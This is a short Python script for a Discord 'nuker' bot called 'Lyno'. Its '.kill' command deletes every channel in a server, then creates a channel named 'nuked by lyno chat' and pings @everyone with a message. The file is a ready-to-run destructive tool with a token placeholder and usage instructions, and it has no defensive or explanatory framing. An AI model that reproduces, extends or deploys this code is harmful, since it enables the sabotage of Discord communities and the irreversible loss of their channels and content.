# 2020 Lyno Modified by Python master source

# CONFIG
TOKEN = 'YOUR_TOKEN'
lyno_message = '@everyone @here hello'
lyno_channelname = 'nuked by lyno chat'
'USE .kill TO EXECUTE COMMAND!'

import discord;from discord.ext import commands;intents = discord.Intents.all();lyno = commands.Bot(command_prefix='.', intents=intents)

@lyno.command()
@commands.has_permissions(manage_channels=True)
async def kill(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()
    new_channel = await guild.create_text_channel(lyno_channelname)
    await new_channel.send(lyno_message)

lyno.run(TOKEN)